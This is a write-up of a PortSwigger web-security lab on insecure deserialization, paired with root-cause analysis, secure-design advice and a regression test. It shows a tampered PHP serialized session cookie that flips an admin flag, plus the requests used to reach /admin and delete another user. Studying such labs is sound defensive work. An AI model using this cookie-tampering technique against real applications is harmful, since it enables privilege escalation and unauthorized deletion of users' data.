# PortSwigger - Modifying Serialized Objects

## Source

[Lab: Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

## Goal

Determine whether a backend trusts a security-sensitive property stored in a client-controlled serialized session object.

## Original request state

The session cookie was URL- and Base64-encoded.

After decoding:

```text
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

Interpretation:

```text
User {
    username = "wiener"
    admin = false
}
```

## Integrity assumption tested

> The backend may trust the `admin` property from the client-controlled session object without verifying its integrity or checking trusted server-side authorization state.

## Controlled modification

Only this value changed:

```text
b:0
```

to:

```text
b:1
```

The modified object became:

```text
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

The object was then Base64-encoded and URL-encoded again.

## Evidence

### Evidence 1: UI behaviour

The account response displayed:

```text
/admin
```

This was useful but not sufficient by itself because a visible link does not prove endpoint authorization.

### Evidence 2: Protected endpoint

A request to:

```http
GET /admin
```

returned the administration panel with user-deletion actions.

This demonstrated administrative access.

### Evidence 3: Administrative action

A request to:

```http
GET /admin/delete?username=carlos
```

returned:

```http
HTTP/2 302 Found
Location: /admin
```

The action completed and the lab was solved.

## Facts

- The session cookie contained a serialized PHP object.
- The object included a client-controlled `admin` boolean.
- Base64 and URL encoding did not prevent modification.
- The backend accepted `admin=true`.
- The backend returned the admin panel.
- The backend allowed deletion of another user.

## Assumptions not required

- No claim of remote code execution.
- No claim that a gadget chain existed.
- No claim that all application sessions used the same mechanism.
- No claim about the exact backend source code.

## Integrity failure

The application accepted modified serialized client state without sufficient integrity verification.

## Access-control impact

The accepted state caused privilege escalation:

```text
normal user
    -> altered admin property
    -> administrative access
    -> deletion of another user
```

## Root cause

> The application deserialized client-controlled session data and trusted its security-sensitive `admin` property without sufficient integrity protection or server-side authorization verification.

## Secure design

Preferred:

```text
opaque session identifier
    -> server-side session store
    -> role loaded from trusted data
    -> authorization checked on each endpoint
```

If client-side state is unavoidable:

- authenticate it with a strong MAC/signature,
- verify before deserialization or use,
- bind it to context and expiry,
- reject invalid state,
- still enforce authorization server-side,
- avoid generic native object deserialization.

## Regression test

Given a valid non-admin session, changing the client-side admin value must not:

- display trusted admin state,
- allow `/admin`,
- permit administrative actions.

The request must be rejected or evaluated using trusted server-side permissions.
